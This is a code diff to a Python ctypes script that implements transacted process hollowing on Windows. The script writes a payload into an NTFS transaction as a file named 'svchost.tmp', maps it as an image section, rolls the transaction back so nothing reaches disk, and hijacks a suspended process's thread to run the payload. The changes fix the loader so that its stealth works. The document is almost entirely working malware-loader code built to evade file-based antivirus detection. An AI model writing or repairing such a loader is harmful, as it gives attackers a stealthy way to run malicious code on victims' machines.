@@ -83,32 +83,32 @@ CloseHandle=k.CloseHandle
 CloseHandle.argtypes=[wintypes.HANDLE]
 CloseHandle.restype=wintypes.BOOL
 
-# Transaction APIs
-NtCreateTransaction=n.NtCreateTransaction
-NtCreateTransaction.argtypes=[ctypes.POINTER(wintypes.HANDLE),wintypes.DWORD,ctypes.POINTER(OBJECT_ATTRIBUTES),ctypes.POINTER(ctypes.c_uint64),wintypes.ULONG,wintypes.ULONG,wintypes.ULONG,ctypes.POINTER(UNICODE_STRING),wintypes.HANDLE,ctypes.POINTER(ctypes.c_uint64)]
-NtCreateTransaction.restype=ctypes.c_ulong
-
+# Transaction APIs (using KtmW32.dll)
 ktm=ctypes.windll.ktmw32
-CreateFileTransactedA=ktm.CreateFileTransactedA
-CreateFileTransactedA.argtypes=[wintypes.LPCSTR,wintypes.DWORD,wintypes.DWORD,wintypes.LPVOID,wintypes.DWORD,wintypes.DWORD,wintypes.HANDLE,wintypes.LPVOID,wintypes.LPVOID]
-CreateFileTransactedA.restype=wintypes.HANDLE
+CreateTransaction=ktm.CreateTransaction
+CreateTransaction.argtypes=[wintypes.LPVOID,wintypes.LPVOID,wintypes.DWORD,wintypes.DWORD,wintypes.DWORD,wintypes.DWORD,wintypes.LPVOID]
+CreateTransaction.restype=wintypes.HANDLE
+
+CreateFileTransactedW=ktm.CreateFileTransactedW
+CreateFileTransactedW.argtypes=[wintypes.LPCWSTR,wintypes.DWORD,wintypes.DWORD,wintypes.LPVOID,wintypes.DWORD,wintypes.DWORD,wintypes.LPVOID,wintypes.HANDLE,wintypes.LPVOID,wintypes.LPVOID]
+CreateFileTransactedW.restype=wintypes.HANDLE
+
+RollbackTransaction=ktm.RollbackTransaction
+RollbackTransaction.argtypes=[wintypes.HANDLE]
+RollbackTransaction.restype=wintypes.BOOL
 
 WriteFile=k.WriteFile
 WriteFile.argtypes=[wintypes.HANDLE,wintypes.LPVOID,wintypes.DWORD,ctypes.POINTER(wintypes.DWORD),wintypes.LPVOID]
 WriteFile.restype=wintypes.BOOL
 
 def transacted_hollow(payload):
-    # Create NTFS transaction (file won't be on disk until committed - we never commit)
-    hTransaction=wintypes.HANDLE()
-    objAttr=OBJECT_ATTRIBUTES()
-    objAttr.Length=ctypes.sizeof(OBJECT_ATTRIBUTES)
-    timeout=ctypes.c_uint64(0)
-    status=NtCreateTransaction(ctypes.byref(hTransaction),0x2000000,ctypes.byref(objAttr),None,0,0,0,None,None,ctypes.byref(timeout))
-    if status!=0:return False
+    # Create NTFS transaction (file won't be on disk until committed - we rollback, so never on disk)
+    hTransaction=CreateTransaction(None,None,0,0,0,0,None)
+    if hTransaction==-1:return False
     
-    # Create transacted file (hidden until commit - we never commit, so it's never on disk)
-    transactedPath=b"C:\\Windows\\Temp\\svchost.tmp"
-    hTransactedFile=CreateFileTransactedA(transactedPath,0x40000000|0x80000000,0,None,2,0x80,hTransaction,None,None)
+    # Create transacted file (hidden until commit - we rollback, so it's never on disk)
+    transactedPath="C:\\Windows\\Temp\\svchost.tmp"
+    hTransactedFile=CreateFileTransactedW(transactedPath,0x40000000|0x80000000,0,None,2,0x80,None,hTransaction,None,None)
     if hTransactedFile==-1:
         CloseHandle(hTransaction)
         return False
@@ -119,14 +119,17 @@ def transacted_hollow(payload):
     
     # Create section from transacted file (SEC_IMAGE requires a file)
     hSection=wintypes.HANDLE()
-    sectionAttr=OBJECT_ATTRIBUTES()
-    sectionAttr.Length=ctypes.sizeof(OBJECT_ATTRIBUTES)
     size=ctypes.c_uint64(len(payload))
-    status=NtCreateSection(ctypes.byref(hSection),wintypes.DWORD(0xF0000000),ctypes.byref(sectionAttr),ctypes.byref(size),PAGE_EXECUTE_READWRITE,SEC_IMAGE,hTransactedFile)
+    status=NtCreateSection(ctypes.byref(hSection),wintypes.DWORD(0xF0000000),None,ctypes.byref(size),PAGE_READONLY,SEC_IMAGE,hTransactedFile)
     CloseHandle(hTransactedFile)
     if status!=0:
+        RollbackTransaction(hTransaction)
         CloseHandle(hTransaction)
         return False
+    
+    # Rollback transaction - file never appears on disk!
+    RollbackTransaction(hTransaction)
+    CloseHandle(hTransaction)
     
     # Map section into current process
     localBase=ctypes.c_void_p()
@@ -191,20 +194,20 @@ def transacted_hollow(payload):
     entryPointRVA=struct.unpack('<I',ntHeaders[24:28])[0]
     entryPoint=ctypes.cast(remoteBase,ctypes.POINTER(ctypes.c_byte))+entryPointRVA
     
-    # Update thread context
+    # Update thread context (use CONTEXT_INTEGER and set Rcx for x64 entry point)
     ctx=CONTEXT()
-    ctx.ContextFlags=CONTEXT_FULL
+    ctx.ContextFlags=0x10001  # CONTEXT_INTEGER
     GetThreadContext(pi.hThread,ctypes.byref(ctx))
+    ctx.Rcx=ctypes.cast(entryPoint,ctypes.c_uint64).value
     ctx.Rip=ctypes.cast(entryPoint,ctypes.c_uint64).value
     SetThreadContext(pi.hThread,ctypes.byref(ctx))
     
     # Resume process
     NtResumeProcess(pi.hProcess)
     
-    # Cleanup (don't commit transaction - file never appears on disk!)
+    # Cleanup (transaction already rolled back - file never appeared on disk!)
     NtUnmapViewOfSection(ctypes.windll.kernel32.GetCurrentProcess(),localBase)
     CloseHandle(hSection)
-    CloseHandle(hTransaction)  # Transaction rolled back - file never written to disk
     CloseHandle(pi.hThread)
     CloseHandle(pi.hProcess)
     return True
